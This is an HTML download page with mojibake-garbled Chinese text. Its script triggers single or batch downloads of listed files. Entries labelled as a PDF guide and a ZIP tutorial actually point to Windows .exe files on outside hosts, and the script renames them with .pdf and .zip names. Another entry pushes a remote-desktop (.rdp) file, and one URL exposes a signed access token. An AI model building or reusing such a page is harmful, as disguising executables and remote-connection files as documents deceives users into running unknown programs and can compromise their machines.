<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>æ–‡ä»¶ä¸‹è½½ä¸­å¿ƒ</title>
	<style>
  
  * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Microsoft YaHei', sans-serif;
        }

        body {
            background-color: #f5f7fa;
            padding: 40px 20px;
        }

        .download-container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            padding: 30px;
        }

        .container-header {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid #eee;
        }

        .container-header h1 {
            color: #2c3e50;
            font-size: 28px;
            margin-bottom: 10px;
        }

        .container-header p {
            color: #7f8c8d;
            font-size: 16px;
        }

        .file-list {
            margin-bottom: 30px;
        }

        .file-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 15px 20px;
            background: #f8f9fa;
            border-radius: 8px;
            margin-bottom: 12px;
            transition: all 0.3s ease;
        }

        .file-item:hover {
            transform: translateY(-2px);
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
        }

        .file-info {
            display: flex;
            align-items: center;
        }

        .file-icon {
            width: 36px;
            height: 36px;
            background-color: #3498db;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: white;
            font-size: 18px;
        }

        .file-name {
            color: #2c3e50;
            font-size: 16px;
            font-weight: 500;
        }

        .btn {
            padding: 8px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s ease;
        }

        .btn-primary {
            background-color: #3498db;
            color: white;
        }

        .btn-primary:hover {
            background-color: #2980b9;
        }

        .btn-primary:active {
            background-color: #1f618d;
        }

        .btn-success {
            background-color: #2ecc71;
            color: white;
        }

        .btn-success:hover {
            background-color: #27ae60;
        }

        .btn-success:active {
            background-color: #219653;
        }

        .batch-download {
            text-align: center;
            margin-top: 20px;
        }

        .batch-btn {
            padding: 12px 30px;
            font-size: 16px;
        }

        /* ä¸‹è½½çŠ¶æ€æç¤º */
        .download-status {
            margin-left: 10px;
            color: #27ae60;
            font-size: 14px;
            display: none;
        }

        /* æ‰¹é‡ä¸‹è½½è¿›åº¦æ¡æ ·å¼ */
        .progress-container {
            width: 80%;
            margin: 15px auto 0;
            display: none;
        }

        .progress-bar-bg {
            height: 8px;
            background-color: #eee;
            border-radius: 4px;
            overflow: hidden;
        }

        .progress-bar {
            height: 100%;
            background-color: #2ecc71;
            border-radius: 4px;
            width: 0%;
            transition: width 0.3s ease;
        }

        .progress-text {
            margin-top: 8px;
            color: #7f8c8d;
            font-size: 14px;
            text-align: center;
        }

        /* å“åº”å¼é€‚é… */
        @media (max-width: 600px) {
            .file-item {
                flex-direction: column;
                align-items: flex-start;
                gap: 15px;
            }

            .file-info {
                width: 100%;
            }

            .btn {
                width: 100%;
            }

            .download-status {
                margin-left: 0;
                margin-top: 5px;
            }

            .progress-container {
                width: 100%;
            }
        }
    </style>
  
</head>
<body>
    <div class="download-container">
        <div class="container-header">
            <h1>æ–‡ä»¶ä¸‹è½½ä¸­å¿ƒ</h1>
            <p>æ”¯æŒå•ä¸ªä¸‹è½½æˆ–ä¸€é”®æ‰¹é‡ä¸‹è½½æ‰€æœ‰æ–‡ä»¶</p>
        </div>

        <div class="file-list" id="fileList">
            <!-- æ–‡ä»¶é¡¹ä¼šé€šè¿‡JSåŠ¨æ€ç”Ÿæˆ -->
        </div>

        <div class="batch-download">
            <button class="btn btn-success batch-btn" onclick="downloadAllFiles()">ä¸€é”®ä¸‹è½½æ‰€æœ‰æ–‡ä»¶</button>
            <!-- æ‰¹é‡ä¸‹è½½è¿›åº¦æ¡ -->
            <div class="progress-container" id="progressContainer">
                <div class="progress-bar-bg">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
                <div class="progress-text" id="progressText">0/${fileList.length} æ–‡ä»¶å·²ä¸‹è½½</div>
            </div>
        </div>
    </div>
	 <script>
        // å®šä¹‰éœ€è¦ä¸‹è½½çš„æ–‡ä»¶åˆ—è¡¨
        const fileList = [
            {
                name: "GitHubåŠ é€ŸæŒ‡å—.pdf",
                url: "https://swdlcdn.eastmoney.com/swc8_free_new/dfcft8.exe"
            },
            {
                name: "ç¼–ç¨‹å…¥é—¨æ•™ç¨‹.zip",
                url: "https://official-packet.gkoudai.com/PC/lastest/PC_Windows_lastest.exe?AccessKeyId=HST3UM21PWWZMI0DN8PB&Expires=1766937494&x-obs-security-token=ggpjbi1ub3J0aC00T-J7ImFjY2VzcyI6IkhTVDNVTTIxUFdXWk1JMEROOFBCIiwiaXNzdWVkX2F0IjoxNzY2OTE0ODAwMTg1LCJtZXRob2RzIjpbInRva2VuIl0sInJvbGUiOltdLCJyb2xldGFnZXMiOltdLCJ0aW1lb3V0X2F0IjoxNzY2OTUwODAwMTg1LCJ1c2VyIjp7ImRvbWFpbiI6eyJpZCI6IjMyYzUzNGVmMzAwZTRjOGFiZTQ1NTIyNzJkZDViMDIzIiwibmFtZSI6ImhpZF9oXzZhbHdkYzFyZHE1ZjAifSwiaWQiOiJhNTNiMjAxYjI2OWM0MzJjYWU1YjJlMzk0ODc2N2QxMCIsIm5hbWUiOiJ4aWV0YW8iLCJwYXNzd29yZF9leHBpcmVzX2F0IjoiMjAyNi0wMS0yOVQwMjo0MToyOS4wMDAwMDBaIiwidXNlcl90eXBlIjoxNn19l94Act5sIeC7LCSTBGIqpzJdWWG3ufxFB40Oir0di1zWnST0jILIDjmmtqNgvxlyX_jpn-dMm_YIIYg_LwFOWLZsISpdRMWEmjuN6HUHcheL312rKOBWCdVDz1xyN1wT-42cUnq_uRA4qnxmdJpr7pbmGipzqlfRrtxu1NbzYZ7eY_yLNTV6TcvMgdsPumDyt_ezq2-4daNSqXj0P-DXJzeiZ3YAlp8y6kvkBZiHyjDZvhAYT9NZd_Mtj2T0w6pwlFgLMnm6XNQFW_XmY3l9IYa952EjZ-gEpKhQwa2wMKiT4BFlx0Fe2kYkLzki0uaU-duOGHf5gCYmTOhWgSm2Aw%3D%3D&Signature=aafNODhbV3%2B7dZYkt%2FeRCPNzb3o%3D"
            },
            {
                name: "text",
                url: "text.txt"
            },
            {
                name: "cp",
                url: "computer.rdp"
            }
        ];

        // æ‰¹é‡ä¸‹è½½è¿›åº¦è·Ÿè¸ª
        let downloadedCount = 0;
        const progressContainer = document.getElementById('progressContainer');
        const progressBar = document.getElementById('progressBar');
        const progressText = document.getElementById('progressText');

        // é¡µé¢åŠ è½½å®Œæˆåæ¸²æŸ“æ–‡ä»¶åˆ—è¡¨
        window.onload = function() {
            renderFileList();
            // åˆå§‹åŒ–è¿›åº¦æ–‡æœ¬
            progressText.textContent = `0/${fileList.length} æ–‡ä»¶å·²ä¸‹è½½`;
        };

        // æ¸²æŸ“æ–‡ä»¶åˆ—è¡¨åˆ°é¡µé¢
        function renderFileList() {
            const fileListEl = document.getElementById('fileList');
            let html = '';
            
            fileList.forEach((file, index) => {
                // ä¸ºæ¯ä¸ªæ–‡ä»¶é¡¹æ·»åŠ å•ç‹¬çš„ä¸‹è½½æŒ‰é’®å’ŒçŠ¶æ€æç¤º
                html += `
                    <div class="file-item" id="fileItem-${index}">
                        <div class="file-info">
                            <div class="file-icon">ğŸ“„</div>
                            <div class="file-name">${file.name}</div>
                            <span class="download-status" id="status-${index}">âœ“ ä¸‹è½½ä¸­...</span>
                        </div>
                        <button class="btn btn-primary download-btn" onclick="downloadSingleFile(${index})">
                            ç«‹å³ä¸‹è½½
                        </button>
                    </div>
                `;
            });
            
            fileListEl.innerHTML = html;
        }

        // æ›´æ–°æ‰¹é‡ä¸‹è½½è¿›åº¦
        function updateProgress() {
            downloadedCount++;
            const progressPercent = (downloadedCount / fileList.length) * 100;
            progressBar.style.width = `${progressPercent}%`;
            progressText.textContent = `${downloadedCount}/${fileList.length} æ–‡ä»¶å·²ä¸‹è½½`;
            
            // æ‰€æœ‰æ–‡ä»¶ä¸‹è½½å®Œæˆåé‡ç½®è¿›åº¦
            if (downloadedCount >= fileList.length) {
                setTimeout(() => {
                    resetProgress();
                }, 2000);
            }
        }

        // é‡ç½®è¿›åº¦æ¡
        function resetProgress() {
            downloadedCount = 0;
            progressBar.style.width = '0%';
            progressText.textContent = `0/${fileList.length} æ–‡ä»¶å·²ä¸‹è½½`;
            // 3ç§’åéšè—è¿›åº¦æ¡
            setTimeout(() => {
                progressContainer.style.display = 'none';
            }, 1000);
        }

        // ä¸‹è½½å•ä¸ªæ–‡ä»¶ï¼ˆå¢å¼ºç‰ˆï¼‰
        function downloadSingleFile(index, isBatch = false) {
            const file = fileList[index];
            const statusEl = document.getElementById(`status-${index}`);
            const btnEl = document.querySelector(`#fileItem-${index} .download-btn`);
            
            // éªŒè¯æ–‡ä»¶é“¾æ¥
            if (!file || !file.url || file.url === '#') {
                alert(`æ–‡ä»¶ã€${file.name}ã€‘é“¾æ¥æ— æ•ˆï¼Œè¯·æ£€æŸ¥ï¼`);
                if (isBatch) updateProgress(); // å³ä½¿å¤±è´¥ä¹Ÿæ›´æ–°è¿›åº¦
                return;
            }
            
            try {
                // æ˜¾ç¤ºä¸‹è½½çŠ¶æ€
                statusEl.style.display = 'inline';
                btnEl.disabled = true;
                btnEl.textContent = 'ä¸‹è½½ä¸­...';
                
                // åˆ›å»ºä¸´æ—¶aæ ‡ç­¾å®ç°ä¸‹è½½
                const a = document.createElement('a');
                a.href = file.url;
                a.download = file.name; // æŒ‡å®šä¸‹è½½æ–‡ä»¶å
                a.style.display = 'none';
                document.body.appendChild(a);
                
                // è§¦å‘ç‚¹å‡»ä¸‹è½½
                const clickEvent = new MouseEvent('click', {
                    view: window,
                    bubbles: true,
                    cancelable: true
                });
                a.dispatchEvent(clickEvent);
                
                // æ¸…ç†ä¸´æ—¶å…ƒç´ 
                setTimeout(() => {
                    document.body.removeChild(a);
                    // æ¢å¤æŒ‰é’®çŠ¶æ€
                    statusEl.textContent = 'âœ“ ä¸‹è½½å®Œæˆ';
                    setTimeout(() => {
                        statusEl.style.display = 'none';
                        btnEl.disabled = false;
                        btnEl.textContent = 'ç«‹å³ä¸‹è½½';
                    }, 2000);
                    
                    // å¦‚æœæ˜¯æ‰¹é‡ä¸‹è½½ï¼Œæ›´æ–°è¿›åº¦
                    if (isBatch) updateProgress();
                }, 1000);
                
            } catch (error) {
                alert(`æ–‡ä»¶ã€${file.name}ã€‘ä¸‹è½½å¤±è´¥ï¼š${error.message}`);
                // æ¢å¤æŒ‰é’®çŠ¶æ€
                statusEl.style.display = 'none';
                btnEl.disabled = false;
                btnEl.textContent = 'ç«‹å³ä¸‹è½½';
                
                // å¦‚æœæ˜¯æ‰¹é‡ä¸‹è½½ï¼Œæ›´æ–°è¿›åº¦
                if (isBatch) updateProgress();
            }
        }

        // ä¸€é”®ä¸‹è½½æ‰€æœ‰æ–‡ä»¶
        function downloadAllFiles() {
            if (fileList.length === 0) {
                alert('æš‚æ— å¯ä¸‹è½½çš„æ–‡ä»¶ï¼');
                return;
            }
            
            // æ˜¾ç¤ºè¿›åº¦æ¡
            progressContainer.style.display = 'block';
            downloadedCount = 0;
            progressBar.style.width = '0%';
            progressText.textContent = `0/${fileList.length} æ–‡ä»¶å·²ä¸‹è½½`;
            
            alert(`å¼€å§‹æ‰¹é‡ä¸‹è½½ï¼Œå…±${fileList.length}ä¸ªæ–‡ä»¶ï¼Œè¯·ç¨å€™...`);
            
            // ä¾æ¬¡è§¦å‘æ¯ä¸ªæ–‡ä»¶çš„ä¸‹è½½ï¼ˆæ·»åŠ å»¶è¿Ÿé¿å…æµè§ˆå™¨é™åˆ¶ï¼‰
            fileList.forEach((file, index) => {
                setTimeout(() => {
                    downloadSingleFile(index, true); // æ ‡è®°ä¸ºæ‰¹é‡ä¸‹è½½
                }, index * 800); // æ¯ä¸ªæ–‡ä»¶é—´éš”800msï¼Œæ›´ç¨³å®š
            });
        }
    </script>
</body>
</html>


